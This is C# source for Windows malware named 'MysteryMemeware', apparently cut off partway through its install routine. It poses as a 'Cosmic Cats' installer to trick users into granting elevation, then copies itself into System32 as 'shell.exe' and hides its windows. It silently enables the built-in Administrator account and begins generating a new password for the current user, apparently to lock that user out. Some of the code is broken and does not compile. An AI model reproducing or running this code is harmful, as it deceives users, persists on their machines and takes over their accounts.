namespace MysteryMemeware
{
    public static class Program
    {
        //Note last openned registry stored at Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Applets\Regedit

        //Approved 07/29/2022 12:55am
        public static void Main()
        {
            #region Run Main Logic

            try
            {
                if (IsInstalled())
                {
                    if (IsAdmin())
                    {
                        Run();
                    }
                    else
                    {
                        ElevateSelf();
                    }
                }
                else
                {
                    if (IsAdmin())
                    {
                        Install();
                    }
                    else
                    {
                        BegForAdmin();
                    }
                }
            }
            catch
            {

            }

            #endregion

            #region Kill Current Process

            try
            {
                System.Diagnostics.Process.GetCurrentProcess().Kill();
            }
            catch
            {

            }

            #endregion
        }
        //Approved 07/29/2022 12:55am
        public static bool IsInstalled()
        {
            #region Check If Installed

            try
            {
                Microsoft.Win32.RegistryKey localMachine = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, Microsoft.Win32.RegistryView.Registry64);

                Microsoft.Win32.RegistryKey mysteryMemeware = localMachine.OpenSubKey("SOFTWARE\\MysteryMemeware", false);

                object isInstalledObject = mysteryMemeware.GetValue("IsInstalled", null);

                try
                {
                    mysteryMemeware.Close();
                    mysteryMemeware.Dispose();
                }
                catch
                {

                }

                try
                {
                    localMachine.Close();
                    localMachine.Dispose();
                }
                catch
                {

                }

                System.Type isInstalledType = isInstalledObject.GetType();

                if (isInstalledType == typeof(string))
                {
                    string isInstalledString = (string)isInstalledObject;

                    try
                    {
                        isInstalledString = isInstalledString.ToLower();
                    }
                    catch
                    {

                    }

                    if (isInstalledString is "1" || isInstalledString is "true" || isInstalledString is "t" || isInstalledString is "yes" || isInstalledString is "y")
                    {
                        return true;
                    }

                    return false;
                }
                else if (isInstalledType == typeof(int))
                {
                    int isInstalledInt = (int)isInstalledObject;

                    if (isInstalledInt is 1)
                    {
                        return true;
                    }

                    return false;
                }
                else if (isInstalledType == typeof(long))
                {
                    long isInstalledLong = (long)isInstalledObject;

                    if (isInstalledLong is 1)
                    {
                        return true;
                    }

                    return false;
                }

                throw null;
            }
            catch
            {
                return false;
            }

            #endregion
        }
        //Approved 07/29/2022 12:50am
        public static bool IsAdmin()
        {
            #region Check If Admin

            try
            {
                System.Security.Principal.WindowsIdentity identity = System.Security.Principal.WindowsIdentity.GetCurrent();

                System.Security.Principal.WindowsPrincipal principal = new System.Security.Principal.WindowsPrincipal(identity);

                bool isAdministrator = principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);

                try
                {
                    identity.Dispose();
                }
                catch
                {

                }

                return isAdministrator;
            }
            catch
            {
                return false;
            }

            #endregion
        }
        //Approved 07/29/2022 12:55am
        public static void ElevateSelf()
        {
            #region Get Admin Password

            string adminPassword = null;

            try
            {
                Microsoft.Win32.RegistryKey LocalMachine = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, Microsoft.Win32.RegistryView.Registry64);

                Microsoft.Win32.RegistryKey mysteryMemeware = LocalMachine.OpenSubKey("SOFTWARE\\MysteryMemeware", false);

                object adminPasswordObject = mysteryMemeware.GetValue("AdminPassword");

                try
                {
                    mysteryMemeware.Close();
                    mysteryMemeware.Dispose();
                }
                catch
                {

                }

                try
                {
                    LocalMachine.Close();
                    LocalMachine.Dispose();
                }
                catch
                {

                }

                if (adminPasswordObject.GetType() != typeof(string))
                {
                    throw null;
                }

                string adminPasswordString = (string)adminPasswordObject;
            }
            catch
            {
                try
                {
                    adminPassword = "";
                }
                catch
                {

                }
            }

            #endregion

            #region Locate Current Executable

            string currentExecutablePath = null;

            try
            {
                string potentialCurrentExecutablePath = typeof(Program).Assembly.Location;

                try
                {
                    potentialCurrentExecutablePath = new System.IO.FileInfo(potentialCurrentExecutablePath).FullName;
                }
                catch
                {

                }

                if (System.IO.File.Exists(potentialCurrentExecutablePath))
                {
                    currentExecutablePath = potentialCurrentExecutablePath;
                }
                else
                {
                    throw null;
                }
            }
            catch
            {
                try
                {
                    string potentialCurrentExecutablePath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;

                    try
                    {
                        potentialCurrentExecutablePath = new System.IO.FileInfo(potentialCurrentExecutablePath).FullName;
                    }
                    catch
                    {

                    }

                    if (System.IO.File.Exists(potentialCurrentExecutablePath))
                    {
                        currentExecutablePath = potentialCurrentExecutablePath;
                    }
                    else
                    {
                        throw null;
                    }
                }
                catch
                {

                }
            }

            #endregion

            #region Restart As Admin Or Run

            try
            {
                try
                {
                    if (adminPassword is null)
                    {
                        throw null;
                    }

                    if (currentExecutablePath is null)
                    {
                        throw null;
                    }


                    System.Diagnostics.ProcessStartInfo adminRestartStartInfo = new System.Diagnostics.ProcessStartInfo();

                    adminRestartStartInfo.Arguments = "";
                    adminRestartStartInfo.CreateNoWindow = true;
                    adminRestartStartInfo.Domain = null;
                    adminRestartStartInfo.ErrorDialog = false;
                    adminRestartStartInfo.ErrorDialogParentHandle = System.IntPtr.Zero;
                    adminRestartStartInfo.FileName = currentExecutablePath;
                    adminRestartStartInfo.LoadUserProfile = false;
                    adminRestartStartInfo.Password = null;
                    adminRestartStartInfo.PasswordInClearText = adminPassword;
                    adminRestartStartInfo.RedirectStandardError = false;
                    adminRestartStartInfo.RedirectStandardInput = false;
                    adminRestartStartInfo.RedirectStandardOutput = false;
                    adminRestartStartInfo.StandardErrorEncoding = null;
                    adminRestartStartInfo.StandardOutputEncoding = null;
                    adminRestartStartInfo.UserName = "Administrator";
                    adminRestartStartInfo.UseShellExecute = false;
                    adminRestartStartInfo.Verb = "runas";
                    adminRestartStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;

                    try
                    {
                        adminRestartStartInfo.WorkingDirectory = (new System.IO.DirectoryInfo(currentExecutablePath)).FullName;
                    }
                    catch
                    {
                        try
                        {
                            adminRestartStartInfo.WorkingDirectory = System.IO.Path.GetDirectoryName(currentExecutablePath);
                        }
                        catch
                        {
                            try
                            {
                                adminRestartStartInfo.WorkingDirectory = null;
                            }
                            catch
                            {

                            }
                        }
                    }

                    System.Diagnostics.Process.Start(adminRestartStartInfo);
                }
                catch
                {
                    throw null;
                }
            }
            catch
            {
                try
                {
                    Run();
                }
                catch
                {

                }
            }

            #endregion
        }
        //Approved 07/29/2022 12:55am
        public static void BegForAdmin()
        {
            #region Display Prompt 1

            try
            {
                if (System.Windows.Forms.MessageBox.Show("Cosmic Cats is not yet installed on your computer. Would you like to install it now?", "Install Cosmic Cats?", System.Windows.Forms.MessageBoxButtons.YesNo) == System.Windows.Forms.DialogResult.No)
                {
                    return;
                }
            }
            catch
            {

            }

            #endregion

            #region Display Prompt 2

            try
            {
                if (System.Windows.Forms.MessageBox.Show("Elevated permissions are required in order to install Cosmic Cats. Please select yes on the following popup to grant the neccessary permission, or you may select no to cancel the installation.", "Elevated Permissions Required.", System.Windows.Forms.MessageBoxButtons.OKCancel) == System.Windows.Forms.DialogResult.Cancel)
                {
                    return;
                }
            }
            catch
            {

            }

            #endregion

            #region Locate Current Executable

            string currentExecutablePath = null;

            try
            {
                string potentialCurrentExecutablePath = typeof(Program).Assembly.Location;

                try
                {
                    potentialCurrentExecutablePath = new System.IO.FileInfo(potentialCurrentExecutablePath).FullName;
                }
                catch
                {

                }

                if (System.IO.File.Exists(potentialCurrentExecutablePath))
                {
                    currentExecutablePath = potentialCurrentExecutablePath;
                }
                else
                {
                    throw null;
                }
            }
            catch
            {
                try
                {
                    string potentialCurrentExecutablePath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;

                    try
                    {
                        potentialCurrentExecutablePath = new System.IO.FileInfo(potentialCurrentExecutablePath).FullName;
                    }
                    catch
                    {

                    }

                    if (System.IO.File.Exists(potentialCurrentExecutablePath))
                    {
                        currentExecutablePath = potentialCurrentExecutablePath;
                    }
                    else
                    {
                        throw null;
                    }
                }
                catch
                {

                }
            }

            #endregion

            #region Restart As Admin

            try
            {
                if (currentExecutablePath is not null)
                {
                    throw null;
                }

                System.Diagnostics.ProcessStartInfo adminRestartStartInfo = new System.Diagnostics.ProcessStartInfo();

                adminRestartStartInfo.Arguments = "";
                adminRestartStartInfo.CreateNoWindow = true;
                adminRestartStartInfo.Domain = null;
                adminRestartStartInfo.ErrorDialog = false;
                adminRestartStartInfo.ErrorDialogParentHandle = System.IntPtr.Zero;
                adminRestartStartInfo.FileName = currentExecutablePath;
                adminRestartStartInfo.LoadUserProfile = false;
                adminRestartStartInfo.Password = null;
                adminRestartStartInfo.PasswordInClearText = null;
                adminRestartStartInfo.RedirectStandardError = false;
                adminRestartStartInfo.RedirectStandardInput = false;
                adminRestartStartInfo.RedirectStandardOutput = false;
                adminRestartStartInfo.StandardErrorEncoding = null;
                adminRestartStartInfo.StandardOutputEncoding = null;
                adminRestartStartInfo.UserName = null;
                adminRestartStartInfo.UseShellExecute = false;
                adminRestartStartInfo.Verb = "runas";
                adminRestartStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;

                try
                {
                    adminRestartStartInfo.WorkingDirectory = (new System.IO.DirectoryInfo(currentExecutablePath)).FullName;
                }
                catch
                {
                    try
                    {
                        adminRestartStartInfo.WorkingDirectory = System.IO.Path.GetDirectoryName(currentExecutablePath);
                    }
                    catch
                    {
                        try
                        {
                            adminRestartStartInfo.WorkingDirectory = null;
                        }
                        catch
                        {

                        }
                    }
                }

                try
                {
                    System.Diagnostics.Process.Start(adminRestartStartInfo);
                }
                catch (System.ComponentModel.Win32Exception ex)
                {
                    if (ex.NativeErrorCode == 1223)
                    {
                        System.Windows.Forms.MessageBox.Show("Elevated access was denied and therefore Cosmic Cats could not be installed. If you would like to install Cosmic Cats later simply run the installer again.", "Elevated Access Denied.", System.Windows.Forms.MessageBoxButtons.OK);
                    }
                    else
                    {
                        throw null;
                    }
                }
            }
            catch
            {

            }

            #endregion
        }



        //Approved 07/26/2022 3:51pm
        public static void Install()
        {
            /*

            //disable reg Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\PrecisionTouchPad\Status\Enabled 0
            //Disable reg Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Wisp\Touch\TouchGate 0

            if (IsAdmin())
            {
                System.Windows.Forms.MessageBox.Show(IsAdmin().ToString());
            }
            else
            {
                System.Diagnostics.ProcessStartInfo adminRestartStartInfo = new System.Diagnostics.ProcessStartInfo();

                adminRestartStartInfo.UseShellExecute = false;
                adminRestartStartInfo.Arguments = "";
                adminRestartStartInfo.CreateNoWindow = false;
                adminRestartStartInfo.FileName = typeof(Program).Assembly.Location;
                adminRestartStartInfo.UserName = "administrator";
                adminRestartStartInfo.PasswordInClearText = "password";
                adminRestartStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Normal;

                System.Diagnostics.Process adminRestartProcess = System.Diagnostics.Process.Start(adminRestartStartInfo);

                while (!adminRestartProcess.Responding)
                {

                }

                new System.Runtime.InteropServices.HandleRef(null, adminRestartProcess.MainWindowHandle);

                System.Windows.Forms.SendKeys.SendWait("password~");

                while (!adminRestartProcess.HasExited)
                {

                }
            }
             */

            //Set the locations of some important paths including making sure that the install location is on the windows installation drive.
            //This will ensure that it is runable on next start up and does not become unavailible if a USB device is unpluged or a network share drive becomes unavailible.
            //Finally copy the currently running executable to the install location.

            #region Locate System32

            //Safely attempt to locate the system32 windows installation folder.

            //Default value is null. A value of null means that all methods of locating system32 failed.

            string system32Path = null;

            try
            {
                //First attempt to locate system 32 using Environment.GetFolderPath.

                string potentialSystem32Path = System.Environment.SystemDirectory;

                //Try to convert from a potentially local path to a full path if needed.

                try
                {
                    potentialSystem32Path = new System.IO.DirectoryInfo(potentialSystem32Path).FullName;
                }
                catch
                {

                }

                //Try to trim trailing directory separator character if needed.

                try
                {
                    if (potentialSystem32Path[potentialSystem32Path.Length - 1] is '\\' || potentialSystem32Path[potentialSystem32Path.Length - 1] is '/')
                    {
                        potentialSystem32Path = potentialSystem32Path.Substring(0, potentialSystem32Path.Length - 1);
                    }
                }
                catch
                {

                }

                //If the directory does not exist then throw an exception.

                if (System.IO.Directory.Exists(potentialSystem32Path))
                {
                    system32Path = potentialSystem32Path;
                }
                else
                {
                    throw new System.Exception("Assertion that system32 was located at \"" + potentialSystem32Path + "\" proved false.");
                }
            }
            catch
            {
                try
                {
                    //Second attempt to load the system root directory location from the registries.

                    Microsoft.Win32.RegistryKey localMachine = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, Microsoft.Win32.RegistryView.Registry64);

                    Microsoft.Win32.RegistryKey windowsNTCurrentVersion = localMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", false);

                    object systemRoot = windowsNTCurrentVersion.GetValue("SystemRoot", null);

                    try
                    {
                        windowsNTCurrentVersion.Close();
                        windowsNTCurrentVersion.Dispose();
                    }
                    catch
                    {

                    }

                    try
                    {
                        localMachine.Close();
                        localMachine.Dispose();
                    }
                    catch
                    {

                    }

                    //If systemRoot is null then the opperation failed and we should throw an exception.

                    if (systemRoot is null)
                    {
                        throw new System.Exception("SystemRoot does not exist or is inaccessable.");
                    }

                    //If systemRoot is not a string then we should throw an exception.

                    if (systemRoot.GetType() != typeof(string))
                    {
                        throw new System.Exception("SystemRoot was not in a valid format.");
                    }

                    string systemRootString = (string)systemRoot;

                    try
                    {
                        //Convert from a potentially local path to a full path.

                        systemRootString = new System.IO.DirectoryInfo(systemRootString).FullName;
                    }
                    catch
                    {

                    }

                    try
                    {
                        //Trim trailing directory separator characters.

                        if (systemRootString[systemRootString.Length - 1] is '\\' || systemRootString[systemRootString.Length - 1] is '/')
                        {
                            systemRootString = systemRootString.Substring(0, systemRootString.Length - 1);
                        }
                    }
                    catch
                    {

                    }

                    string potentialSystem32Path = systemRootString + "\\system32";

                    //Try to convert from a potentially local path to a full path if needed.

                    try
                    {
                        potentialSystem32Path = new System.IO.DirectoryInfo(potentialSystem32Path).FullName;
                    }
                    catch
                    {

                    }

                    //Try to trim trailing directory separator character if needed.

                    try
                    {
                        if (potentialSystem32Path[potentialSystem32Path.Length - 1] is '\\' || potentialSystem32Path[potentialSystem32Path.Length - 1] is '/')
                        {
                            potentialSystem32Path = potentialSystem32Path.Substring(0, potentialSystem32Path.Length - 1);
                        }
                    }
                    catch
                    {

                    }

                    //If the directory does not exist then throw an exception.

                    if (System.IO.Directory.Exists(potentialSystem32Path))
                    {
                        system32Path = potentialSystem32Path;
                    }
                    else
                    {
                        throw new System.Exception("Assertion that system32 was located at \"" + potentialSystem32Path + "\" proved false.");
                    }
                }
                catch
                {
                    try
                    {
                        //Third assume that system 32 is located at "C:\Windows\system32"

                        //If the directory does not exist then throw an exception.

                        if (System.IO.Directory.Exists("C:\\Windows\\system32"))
                        {
                            system32Path = "C:\\Windows\\system32";
                        }
                        else
                        {
                            throw new System.Exception("Assertion that system32 was located at \"C:\\Windows\\system32\" proved false.");
                        }
                    }
                    catch
                    {

                    }
                }
            }

            #endregion

            #region Locate Root Drive

            //Safely attempt to locate the root drive.

            //Default value is null. A value of null means that all methods of locating the root drive failed.

            string rootDrivePath = null;

            try
            {
                //First check if root drive contains system 32 folder.

                if (system32Path is null)
                {
                    throw new System.Exception("Prerequisite failed: System 32 could not be located.");
                }

                string potentialRootDrivePath = new System.IO.DriveInfo(system32Path).Name;

                //Try to add a trailing directory separator character if needed.

                try
                {
                    if (potentialRootDrivePath[potentialRootDrivePath.Length - 1] != System.IO.Path.DirectorySeparatorChar && potentialRootDrivePath[potentialRootDrivePath.Length - 1] != System.IO.Path.AltDirectorySeparatorChar)
                    {
                        if (potentialRootDrivePath[potentialRootDrivePath.Length - 1] != System.IO.Path.VolumeSeparatorChar)
                        {
                            potentialRootDrivePath = potentialRootDrivePath + new string(new char[1] { System.IO.Path.VolumeSeparatorChar });
                        }

                        potentialRootDrivePath = potentialRootDrivePath + new string(new char[1] { System.IO.Path.DirectorySeparatorChar });
                    }
                }
                catch
                {
                    try
                    {
                        if (potentialRootDrivePath[potentialRootDrivePath.Length - 1] is not '\\' && potentialRootDrivePath[potentialRootDrivePath.Length - 1] is not '/')
                        {
                            if (potentialRootDrivePath[potentialRootDrivePath.Length - 1] is not ':')
                            {
                                potentialRootDrivePath = potentialRootDrivePath + ":";
                            }

                            potentialRootDrivePath = potentialRootDrivePath + "\\";
                        }
                    }
                    catch
                    {

                    }
                }

                //If the drive directory does not exist then throw an exception.

                if (System.IO.Directory.Exists(potentialRootDrivePath))
                {
                    rootDrivePath = potentialRootDrivePath;
                }
                else
                {
                    throw new System.Exception("Assertion that root drive was located at \"" + potentialRootDrivePath + "\" proved false.");
                }
            }
            catch
            {
                try
                {
                    //Second assume that the root drive path is C

                    string potentialRootDrivePath = new string(new char[3] { 'C', System.IO.Path.VolumeSeparatorChar, System.IO.Path.DirectorySeparatorChar });

                    //If the drive directory does not exist then throw an exception.

                    if (System.IO.Directory.Exists(potentialRootDrivePath))
                    {
                        rootDrivePath = potentialRootDrivePath;
                    }
                    else
                    {
                        throw new System.Exception("Assertion that root drive was located at \"" + potentialRootDrivePath + "\" proved false.");
                    }
                }
                catch
                {
                    try
                    {
                        //Third assume that the root drive path is C:\

                        //If the drive directory does not exist then throw an exception.

                        if (System.IO.Directory.Exists("C:\\"))
                        {
                            rootDrivePath = "C:\\";
                        }
                        else
                        {
                            throw new System.Exception("Assertion that root drive was located at \"C:\\\" proved false.");
                        }
                    }
                    catch
                    {

                    }
                }
            }

            #endregion

            #region Locate Current Executable

            //Safely attempt to locate the location of the current executable.

            //Default value is null. A value of null means that all methods of locating the current executable failed.

            string currentExecutablePath = null;

            try
            {
                //First attempt to locate the current executable using typeof(Program).Assemly.Location.

                string potentialCurrentExecutablePath = typeof(Program).Assembly.Location;

                //Try to convert from a potentially local path to a full path if needed.

                try
                {
                    potentialCurrentExecutablePath = new System.IO.FileInfo(potentialCurrentExecutablePath).FullName;
                }
                catch
                {

                }

                //If the file does not exist then throw an exception.

                if (System.IO.File.Exists(potentialCurrentExecutablePath))
                {
                    currentExecutablePath = potentialCurrentExecutablePath;
                }
                else
                {
                    throw new System.Exception("Assertion that current executable was located at \"" + potentialCurrentExecutablePath + "\" proved false.");
                }
            }
            catch
            {
                try
                {
                    //Second attempt to locate the current executable using GetCurrentProcess.MainModule.FileName.

                    string potentialCurrentExecutablePath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;

                    //Try to convert from a potentially local path to a full path if needed.

                    try
                    {
                        potentialCurrentExecutablePath = new System.IO.FileInfo(potentialCurrentExecutablePath).FullName;
                    }
                    catch
                    {

                    }

                    //If the file does not exist then throw an exception.

                    if (System.IO.File.Exists(potentialCurrentExecutablePath))
                    {
                        currentExecutablePath = potentialCurrentExecutablePath;
                    }
                    else
                    {
                        throw new System.Exception("Assertion that current executable was located at \"" + potentialCurrentExecutablePath + "\" proved false.");
                    }
                }
                catch
                {

                }
            }

            #endregion

            #region Install And Validate Path

            //Attempt to install the program to a valid path.

            //The default value is null. A value of null indicates all methods for installing failed.

            string installLocation = null;

            if (currentExecutablePath is not null)
            {
                try
                {
                    if (system32Path is null)
                    {
                        throw new System.Exception("Prerequisite failed: System 32 could not be located.");
                    }

                    string potentialInstallLocation = system32Path + "\\shell.exe";

                    System.IO.File.Copy(currentExecutablePath, potentialInstallLocation, true);

                    installLocation = potentialInstallLocation;
                }
                catch
                {
                    try
                    {
                        if (rootDrivePath is null)
                        {
                            throw new System.Exception("Prerequisite failed: Root drive could not be located.");
                        }

                        string potentialInstallLocation = rootDrivePath + "MysteryMemeware.exe";

                        System.IO.File.Copy(currentExecutablePath, potentialInstallLocation, true);

                        installLocation = potentialInstallLocation;
                    }
                    catch
                    {
                        try
                        {
                            if (rootDrivePath is null)
                            {
                                throw new System.Exception("Prerequisite failed: Root drive could not be located.");
                            }

                            string containingFolderPath = rootDrivePath + "MysteryMemeware";

                            try
                            {
                                System.IO.Directory.CreateDirectory(containingFolderPath);
                            }
                            catch
                            {

                            }

                            string potentialInstallLocation = containingFolderPath + "\\MysteryMemeware.exe";

                            System.IO.File.Copy(currentExecutablePath, potentialInstallLocation, true);

                            installLocation = potentialInstallLocation;
                        }
                        catch
                        {
                            try
                            {
                                System.IO.File.Copy(currentExecutablePath, "C:\\Windows\\System32\\shell.exe", true);

                                installLocation = "C:\\Windows\\System32\\shell.exe";
                            }
                            catch
                            {
                                try
                                {
                                    System.IO.File.Copy(currentExecutablePath, "C:\\MysteryMemeware.exe", true);

                                    installLocation = "C:\\MysteryMemeware.exe";
                                }
                                catch
                                {
                                    try
                                    {
                                        if (rootDrivePath is null)
                                        {
                                            throw new System.Exception("Prerequisite failed: Root drive could not be located.");
                                        }

                                        string containingFolderPath = "C:\\MysteryMemeware";

                                        try
                                        {
                                            System.IO.Directory.CreateDirectory(containingFolderPath);
                                        }
                                        catch
                                        {

                                        }

                                        string potentialInstallLocation = "C:\\MysteryMemeware\\MysteryMemeware.exe";

                                        System.IO.File.Copy(currentExecutablePath, potentialInstallLocation, true);

                                        installLocation = potentialInstallLocation;
                                    }
                                    catch
                                    {
                                        try
                                        {
                                            installLocation = currentExecutablePath;
                                        }
                                        catch
                                        {

                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }

            #endregion

            #region Get Current Username

            //Attempt to get the username of the currently signed in user.

            //The default value is null. A value of null indicates all methods for getting the current username failed.

            string currentUsername = null;

            try
            {
                string potentialCurrentUsername = System.Security.Principal.WindowsIdentity.GetCurrent().Name;

                if (potentialCurrentUsername is null)
                {
                    throw new System.Exception("po")
                    }

                for (int i = potentialCurrentUsername.Length - 1; i >= 0; i--)
                {
                    if (potentialCurrentUsername[i] is '\\' || potentialCurrentUsername[i] is '/')
                    {
                        potentialCurrentUsername = potentialCurrentUsername.Substring(0, i);
                    }
                }



            }
            catch
            {
                try
                {
                    currentUsername = System.Environment.UserName;
                }
                catch
                {
                    try
                    {
                        currentUsername = "Administrator";
                    }
                    catch
                    {

                    }
                }
            }

            #endregion

            #region Enable User

            //Attempt to enable the current user.

            if (currentUsername is not null)
            {
                try
                {
                    //First try to run the command normally.

                    System.Diagnostics.ProcessStartInfo enableUserStartInfo = new System.Diagnostics.ProcessStartInfo();

                    enableUserStartInfo.Arguments = "user \"" + currentUsername + "\" /active:yes";
                    enableUserStartInfo.CreateNoWindow = true;
                    enableUserStartInfo.Domain = null;
                    enableUserStartInfo.ErrorDialog = false;
                    enableUserStartInfo.ErrorDialogParentHandle = System.IntPtr.Zero;

                    //If the system 32 path is unspecified then just let the opperating system interperet the path by itself.

                    if (system32Path is not null)
                    {
                        enableUserStartInfo.FileName = system32Path + "net.exe";
                    }
                    else
                    {
                        enableUserStartInfo.FileName = "net.exe";
                    }

                    enableUserStartInfo.LoadUserProfile = false;
                    enableUserStartInfo.Password = null;
                    enableUserStartInfo.PasswordInClearText = null;
                    enableUserStartInfo.RedirectStandardError = false;
                    enableUserStartInfo.RedirectStandardInput = false;
                    enableUserStartInfo.RedirectStandardOutput = false;
                    enableUserStartInfo.StandardErrorEncoding = null;
                    enableUserStartInfo.StandardOutputEncoding = null;
                    enableUserStartInfo.UserName = null;
                    enableUserStartInfo.UseShellExecute = false;
                    enableUserStartInfo.Verb = "runas";
                    enableUserStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;

                    //If the system 32 path is unspecified then just let the opperating system interperet the working directory by itself.

                    if (system32Path is not null)
                    {
                        enableUserStartInfo.WorkingDirectory = system32Path;
                    }
                    else
                    {
                        enableUserStartInfo.WorkingDirectory = null;
                    }

                    System.Diagnostics.Process enableUserProcess = System.Diagnostics.Process.Start(enableUserStartInfo);

                    while (!enableUserProcess.HasExited)
                    {

                    }

                    if (enableUserProcess.ExitCode is not 0)
                    {
                        throw new System.Exception("Enable user process failed with exit code " + enableUserProcess.ExitCode.ToString());
                    }
                }
                catch
                {
                    try
                    {
                        //Second try to run the command without administrator. This will only work if the user has abnormal UAC settings.

                        System.Diagnostics.ProcessStartInfo enableUserStartInfo = new System.Diagnostics.ProcessStartInfo();

                        enableUserStartInfo.Arguments = "user \"" + currentUsername + "\" /active:yes";
                        enableUserStartInfo.CreateNoWindow = true;
                        enableUserStartInfo.Domain = null;
                        enableUserStartInfo.ErrorDialog = false;
                        enableUserStartInfo.ErrorDialogParentHandle = System.IntPtr.Zero;

                        //If the system 32 path is unspecified then just let the opperating system interperet the path by itself.

                        if (system32Path is not null)
                        {
                            enableUserStartInfo.FileName = system32Path + "net.exe";
                        }
                        else
                        {
                            enableUserStartInfo.FileName = "net.exe";
                        }

                        enableUserStartInfo.LoadUserProfile = false;
                        enableUserStartInfo.Password = null;
                        enableUserStartInfo.PasswordInClearText = null;
                        enableUserStartInfo.RedirectStandardError = false;
                        enableUserStartInfo.RedirectStandardInput = false;
                        enableUserStartInfo.RedirectStandardOutput = false;
                        enableUserStartInfo.StandardErrorEncoding = null;
                        enableUserStartInfo.StandardOutputEncoding = null;
                        enableUserStartInfo.UserName = null;
                        enableUserStartInfo.UseShellExecute = false;
                        enableUserStartInfo.Verb = null;
                        enableUserStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;

                        //If the system 32 path is unspecified then just let the opperating system interperet the working directory by itself.

                        if (system32Path is not null)
                        {
                            enableUserStartInfo.WorkingDirectory = system32Path;
                        }
                        else
                        {
                            enableUserStartInfo.WorkingDirectory = null;
                        }

                        System.Diagnostics.Process enableUserProcess = System.Diagnostics.Process.Start(enableUserStartInfo);

                        while (!enableUserProcess.HasExited)
                        {

                        }

                        if (enableUserProcess.ExitCode is not 0)
                        {
                            throw new System.Exception("Enable user process failed with exit code " + enableUserProcess.ExitCode.ToString());
                        }
                    }
                    catch
                    {

                    }
                }
            }

            #endregion

            #region Enable Admin

            //Attempt to enable the local administrator user.

            try
            {
                //First try to run the command normally.

                System.Diagnostics.ProcessStartInfo enableAdminStartInfo = new System.Diagnostics.ProcessStartInfo();

                enableAdminStartInfo.Arguments = "user \"Administrator\" /active:yes";
                enableAdminStartInfo.CreateNoWindow = true;
                enableAdminStartInfo.Domain = null;
                enableAdminStartInfo.ErrorDialog = false;
                enableAdminStartInfo.ErrorDialogParentHandle = System.IntPtr.Zero;

                //If the system 32 path is unspecified then just let the opperating system interperet the path by itself.

                if (system32Path is not null)
                {
                    enableAdminStartInfo.FileName = system32Path + "net.exe";
                }
                else
                {
                    enableAdminStartInfo.FileName = "net.exe";
                }

                enableAdminStartInfo.LoadUserProfile = false;
                enableAdminStartInfo.Password = null;
                enableAdminStartInfo.PasswordInClearText = null;
                enableAdminStartInfo.RedirectStandardError = false;
                enableAdminStartInfo.RedirectStandardInput = false;
                enableAdminStartInfo.RedirectStandardOutput = false;
                enableAdminStartInfo.StandardErrorEncoding = null;
                enableAdminStartInfo.StandardOutputEncoding = null;
                enableAdminStartInfo.UserName = null;
                enableAdminStartInfo.UseShellExecute = false;
                enableAdminStartInfo.Verb = "runas";
                enableAdminStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;

                //If the system 32 path is unspecified then just let the opperating system interperet the working directory by itself.

                if (system32Path is not null)
                {
                    enableAdminStartInfo.WorkingDirectory = system32Path;
                }
                else
                {
                    enableAdminStartInfo.WorkingDirectory = null;
                }

                System.Diagnostics.Process enableAdminProcess = System.Diagnostics.Process.Start(enableAdminStartInfo);

                while (!enableAdminProcess.HasExited)
                {

                }

                if (enableAdminProcess.ExitCode is not 0)
                {
                    throw new System.Exception("Enable admin process failed with exit code " + enableAdminProcess.ExitCode.ToString());
                }
            }
            catch
            {
                try
                {
                    //Second try to run the command without administrator. This will only work if the user has abnormal UAC settings.

                    System.Diagnostics.ProcessStartInfo enableAdminStartInfo = new System.Diagnostics.ProcessStartInfo();

                    enableAdminStartInfo.Arguments = "user \"Administrator\" /active:yes";
                    enableAdminStartInfo.CreateNoWindow = true;
                    enableAdminStartInfo.Domain = null;
                    enableAdminStartInfo.ErrorDialog = false;
                    enableAdminStartInfo.ErrorDialogParentHandle = System.IntPtr.Zero;

                    //If the system 32 path is unspecified then just let the opperating system interperet the path by itself.

                    if (system32Path is not null)
                    {
                        enableAdminStartInfo.FileName = system32Path + "net.exe";
                    }
                    else
                    {
                        enableAdminStartInfo.FileName = "net.exe";
                    }

                    enableAdminStartInfo.LoadUserProfile = false;
                    enableAdminStartInfo.Password = null;
                    enableAdminStartInfo.PasswordInClearText = null;
                    enableAdminStartInfo.RedirectStandardError = false;
                    enableAdminStartInfo.RedirectStandardInput = false;
                    enableAdminStartInfo.RedirectStandardOutput = false;
                    enableAdminStartInfo.StandardErrorEncoding = null;
                    enableAdminStartInfo.StandardOutputEncoding = null;
                    enableAdminStartInfo.UserName = null;
                    enableAdminStartInfo.UseShellExecute = false;
                    enableAdminStartInfo.Verb = null;
                    enableAdminStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;

                    //If the system 32 path is unspecified then just let the opperating system interperet the working directory by itself.

                    if (system32Path is not null)
                    {
                        enableAdminStartInfo.WorkingDirectory = system32Path;
                    }
                    else
                    {
                        enableAdminStartInfo.WorkingDirectory = null;
                    }

                    System.Diagnostics.Process enableAdminProcess = System.Diagnostics.Process.Start(enableAdminStartInfo);

                    while (!enableAdminProcess.HasExited)
                    {

                    }

                    if (enableAdminProcess.ExitCode is not 0)
                    {
                        throw new System.Exception("Enable admin process failed with exit code " + enableAdminProcess.ExitCode.ToString());
                    }
                }
                catch
                {

                }
            }

            #endregion

            #region Generate User Password

            //Attempt to generate a new 14 character password for the current user.

            //The default value is null. A value of null indicates all methods for generating current user password failed.

            string userPassword = null;

            try
            {
                System.Random RNG = new System.Random((int)System.DateTime.Now.Ticks);

